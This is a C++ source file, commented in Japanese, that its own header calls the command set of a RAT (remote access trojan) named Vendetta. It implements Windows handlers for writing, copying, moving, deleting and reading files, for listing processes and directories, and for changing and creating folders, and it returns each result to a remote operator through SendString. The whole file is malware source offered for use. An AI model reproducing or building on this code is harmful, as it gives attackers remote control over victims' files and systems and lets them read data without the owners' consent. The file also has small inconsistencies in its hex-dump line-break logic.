// RATのコマンドを定義
#include "Vendetta.h"





void Write(std::vector<std::string>& tokens) {

    // ヘルプ
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "使用方法: write <モード> <ファイル名> <書き込む文字列>" + newline +
            "説明: 指定したファイルに文字列を書き込みます。モードを指定することで、" + newline +
            "ファイルに文字列を追記するか、既存の内容を上書きするかを選択できます。" + newline + newline +
            "パラメータ:" + newline +
            "  <モード> 書き込みモードを指定します:" + newline +
            "           append: 既存の内容に追加する形で書き込みます" + newline +
            "           overwrite: ファイルの既存内容を削除して書き込みます" + newline +
            "  <ファイル名> 書き込む対象のファイル名またはパス" + newline +
            "  <書き込む文字列> ファイルに書き込む文字列" + newline + newline +
            "使用例:" + newline +
            "  write overwrite myfile.txt HelloWorld" + newline;

        SendString(helpStr);
        return;
    }

    
    if (tokens.size() < 4) {
        SendString("使用方法: write <モード> <ファイル名> <書き込む文字列>");
        return;
    }

    std::string mode = tokens[1];
    std::string filename = tokens[2];
    std::string text;

    // 引数に指定されたテキストを結合する
    for (size_t i = 3; i < tokens.size(); ++i) {
        text += tokens[i] + " ";
    }

    std::ofstream file;

    // 追記
    if (mode == "append") {
        file.open(filename, std::ios::app);
    }
    // 上書き
    else if (mode == "overwrite") {
        file.open(filename, std::ios::trunc);
    }
    else {
        SendString("[-] 無効なモードです");
        return;
    }

    if (file.is_open()) {
        file << text << std::endl;
        SendString("[+] ファイルに書き込みました: " + filename);
    }
    else {
        SendString("[-] ファイルを開けませんでした");
    }
}





void Pwd(std::vector<std::string>& tokens) {

    // ヘルプ
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "使用方法: pwd" + newline +
            "説明: 現在の作業ディレクトリのパスを表示します";

        SendString(helpStr);
        return;
    }

    char currentDir[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
        SendString(std::string(currentDir));
    }
    else {
        SendString("[-] カレントディレクトリの取得に失敗");
    }
}


void ProcessList(std::vector<std::string>& tokens) {
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // プロセスのスナップショットを取得
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        SendString("[-] スナップショットの作成に失敗しました");
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hProcessSnap, &pe32)) {
        SendString("[-] プロセス情報の取得に失敗しました");
        return;
    }

    // 列幅の定義
    const int pidWidth = 8;
    const int nameWidth = 40;
    const int archWidth = 15;
    const int threadsWidth = 12;
    const int priorityWidth = 10;
    const int memoryWidth = 15;

    // UTF-8でエンコードされたヘッダー文字列
    std::ostringstream processList;
    processList << std::left
        << std::setw(pidWidth) << "PID"
        << std::setw(nameWidth) << "プロセス名"
        << std::setw(archWidth) << "アーキテクチャ"
        << std::setw(threadsWidth) << "スレッド数"
        << std::setw(priorityWidth) << "優先度"
        << std::setw(memoryWidth) << "メモリ(MB)"
        << "\n"
        << std::string(100, '-') << "\n"; // 区切り線

    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE ,pe32.th32ProcessID);

        std::string architecture = "不明";
        BOOL isWow64 = FALSE;
        if (hProcess != NULL) {
            if (IsWow64Process(hProcess, &isWow64)) {
                architecture = isWow64 ? "x86" : "x64";
            }
        }

        // メモリ情報の取得
        PROCESS_MEMORY_COUNTERS_EX pmc;
        std::string memoryUsage = "N/A";
        if (hProcess != NULL && GetProcessMemoryInfo(hProcess, (PROCESS_MEMORY_COUNTERS*)&pmc, sizeof(pmc))) {
            double memMB = pmc.WorkingSetSize / (1024.0 * 1024.0);
            std::ostringstream memStream;
            memStream << std::fixed << std::setprecision(1) << memMB;
            memoryUsage = memStream.str();
        }

        // プロセス名をワイド文字からUTF-8に変換
        std::string processName;
        int name_size = WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, nullptr, 0, nullptr, nullptr);
        if (name_size > 0) {
            std::vector<char> buffer(name_size);
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, buffer.data(), name_size, nullptr, nullptr);
            processName = buffer.data();
        }

        // プロセス情報の出力
        processList << std::left
            << std::setw(pidWidth) << pe32.th32ProcessID
            << std::setw(nameWidth) << processName
            << std::setw(archWidth) << architecture
            << std::setw(threadsWidth) << pe32.cntThreads
            << std::setw(priorityWidth) << pe32.pcPriClassBase
            << std::setw(memoryWidth) << memoryUsage
            << "\n";

        if (hProcess != NULL) {
            CloseHandle(hProcess);
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    SendString(processList.str());
    CloseHandle(hProcessSnap);
}

void Touch(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("使用方法: touch <ファイル名>");
        return;
    }

    std::string filename = tokens[1];
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        SendString("[+] ファイル作成: " + filename);
    }
    else {
        SendString("[-] ファイルの作成に失敗");
    }
}



void Copy(std::vector<std::string>& tokens) {
    if (tokens.size() < 3) {
        SendString("使用方法: cp <ソース> <宛先>");
        return;
    }

    std::string source = tokens[1];
    std::string destination = tokens[2];

    std::ifstream src(source, std::ios::binary);
    std::ofstream dst(destination, std::ios::binary);

    if (src && dst) {
        dst << src.rdbuf();
        SendString("[+] " + source + " から " + destination + " へコピーしました: ");
    }
    else {
        SendString("[-] ファイルをコピーできませんでした");
    }
}

// mvコマンド (ファイルやディレクトリの移動)
void Move(std::vector<std::string>& tokens) {
    if (tokens.size() < 3) {
        SendString("使用方法: mv <ソース> <宛先>");
        return;
    }

    std::string source = tokens[1];
    std::string destination = tokens[2];

    if (MoveFileA(source.c_str(), destination.c_str())) {
        SendString("[+] " + source + " から " + destination + " へ移動しました");
    }
    else {
        SendString("[-] ファイルを移動できませんでした");
    }
}


void Remove(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("使用方法: rm <ファイル名>");
        return;
    }

    std::string filename = tokens[1];
    if (DeleteFileA(filename.c_str())) {
        SendString("[+] ファイル削除: " + filename);
    }
    else {
        SendString("[-] ファイルの削除に失敗");
    }
}

void Dir(std::vector<std::string>& tokens) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA("*", &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    std::ostringstream fileList;
    fileList << std::left << std::setw(20) << "日付/時刻" << std::setw(12) << "サイズ" << "名前" << "\n";

    do {
        // ファイルやディレクトリの属性を取得
        bool isDir = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

        // 更新日時を取得
        FILETIME ft = findFileData.ftLastWriteTime;
        SYSTEMTIME st;
        FileTimeToSystemTime(&ft, &st);

        // サイズを取得
        std::string sizeStr;
        if (isDir) {
            sizeStr = " ";
        }
        else {
            sizeStr = std::to_string(findFileData.nFileSizeLow);
            if (findFileData.nFileSizeLow >= 1024) {
                sizeStr = std::to_string(findFileData.nFileSizeLow / 1024) + " KB";
            }
            else {
                sizeStr += " b";
            }
        }

        // 日時のフォーマット
        char dateTimeStr[20];
        sprintf_s(dateTimeStr, sizeof(dateTimeStr), "%04d/%02d/%02d %02d:%02d",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        // ファイルリストに追加
        fileList << std::left << std::setw(20) << dateTimeStr
            << std::setw(12) 
            << sizeStr
            << (isDir ? "<DIR>" : "   ") 
            << " " 
            << findFileData.cFileName 
            << "\n";

    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
    SendString(fileList.str());
}







void Cat(std::vector<std::string>& tokens) {
    bool binaryMode = false;

    // ヘルプ
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "使用方法: cat <ファイル名> [-b]" + newline +
            "説明: 指定したファイルの内容を表示します。" + newline + newline +
            "オプション:" + newline +
            "  -b : バイナリモードでファイルを表示します。内容は16進数のバイト列で出力され、" + newline +
            "       各バイトはスペースで区切られます。" + newline + newline +
            "詳細:" + newline +
            "  'cat' コマンドは、テキストファイルやバイナリファイルの内容を標準出力に表示します。" + newline +
            "  テキストファイルの場合は各行を改行で区切って表示します。バイナリモードでは、" + newline +
            "  各バイトが16進数形式で表示され、64バイトごとに改行されます。" + newline + newline +
            "使用例:" + newline +
            "  cat example.txt   - テキストモードで 'example.txt' の内容を表示" + newline +
            "  cat example.bin -b - バイナリモードで 'example.bin' の内容を16進数表示" + newline;

        SendString(helpStr);
        return;
    }

    // ファイル名の存在チェック
    if (tokens.size() < 2) {
        SendString("使用方法: cat <ファイル名> [-b]");
        return;
    }

    // オプションの処理
    std::string filename = tokens[1];
    if (tokens.size() > 2 && tokens[2] == "-b") {
        binaryMode = true;
    }

    std::ifstream file(filename, binaryMode ? std::ios::binary : std::ios::in);

    // ファイルが開けない場合のエラー処理
    if (!file.is_open()) {
        SendString("エラー: ファイル '" + filename + "' を開けません");
        return;
    }

    std::ostringstream fileContents;
    if (binaryMode) {
        // バイナリファイルを16進数で表示
        char byte;
        int byteCount = 0;
        while (file.get(byte)) {
            fileContents << std::hex << std::setw(2) << std::setfill('0') << (static_cast<int>(byte) & 0xff) << " ";
            byteCount++;

            // 16バイトごとに改行
            if (byteCount % 64 == 0) {
                fileContents << "\n";
            }
        }
        // 最後に改行がない場合は改行を追加
        if (byteCount % 16 != 0) {
            fileContents << "\n";
        }
    }
    else {
        // テキストファイルの読み込み
        std::string line;
        while (std::getline(file, line)) {
            fileContents << line << "\n";
        }
    }

    file.close();

    // ファイルの内容を送信
    SendString(fileContents.str());
}



void Cd(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("使用方法: cd <ディレクトリ>");
        return;
    }

    std::string directory = tokens[1];

    // ディレクトリを変更
    if (SetCurrentDirectoryA(directory.c_str())) {
        SendString("Changed directory to: " + directory);
    }
    else {
        SendString("Error: Unable to change directory");
    }
}






void MkDir(std::vector<std::string>& tokens) {
    // ヘルプ
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "使用方法: mkdir <フォルダ名>" + newline +
            "説明: 新しいフォルダを作成します";
        SendString(helpStr);
        return;
    }

    if (tokens.size() < 2) {
        SendString("使用方法: mkdir <フォルダ名>");
        return;
    }

    std::string dirName = tokens[1];
    if (CreateDirectoryA(dirName.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        SendString("Created directory: " + dirName);
    }
    else {
        SendString("Error: Unable to create directory");
    }
}

void Rmdir(std::vector<std::string>& tokens) {

    // ヘルプ
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "使用方法: rmdir" + newline +
            "説明: フォルダを削除します";

        SendString(helpStr);
        return;
    }
    if (tokens.size() < 2) {
        SendString("使用方法: rmdir <削除するフォルダ名>");
        return;
    }

    std::string dirName = tokens[1];
    if (RemoveDirectoryA(dirName.c_str())) {
        SendString("Removed directory: " + dirName);
    }
    else {
        SendString("Error: Unable to remove directory");
    }
}